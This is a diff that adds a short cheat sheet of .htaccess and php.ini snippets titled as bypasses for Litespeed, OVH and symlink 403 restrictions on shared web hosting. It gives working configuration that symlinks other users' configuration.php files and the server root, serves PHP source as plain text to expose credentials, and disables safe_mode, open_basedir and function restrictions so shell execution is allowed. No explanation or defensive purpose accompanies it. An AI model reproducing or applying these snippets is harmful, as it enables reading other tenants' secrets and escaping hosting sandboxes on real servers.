@@ -1,0 +1,51 @@
+- [ Bypass Directory ]-
+<Directory "/home/user/public_html">
+Options -ExecCGI
+AllowOverride AuthConfig Indexes Limit FileInfo options=IncludesNOEXEC,Indexes,Includes,MultiViews ,SymLinksIfOwnerMatch,FollowSymLinks
+</Directory>
+
+- [ Include symlink ]-
+Options Indexes FollowSymLinks
+DirectoryIndex ssssss.htm
+AddType txt .php
+AddHandler txt .php
+
+- [ Bypass Litespeed ] -
+wew.shtml
+do ==> ln -ls /home/user/public_html/configuration.php wew.shtml
+.htaccess
+Options +FollowSymLinks
+DirectoryIndex chesss.html
+RemoveHandler .php
+AddType application/octet-stream .php
+
+- [ Bypass OVH ]-
+.htaccess
+Options +FollowSymLinks
+DirectoryIndex Index.html
+Options +Indexes
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType root .root
+AddHandler cgi-script .root
+AddHandler cgi-script .root
+php.ini
+safe_mode = Off
+disable_functions =
+safe_mode_gid = Off
+open_basedir = Off
+register_globals = on
+exec = On
+shell_exec = On
+ln -s / CoderSec
+
+- [ Bypass Symlink 403 forbidden ] -
+.htaccess
+Options all
+DirectoryIndex Sux.html
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+AddHandler txt .html
+Require None
+Satisfy Any
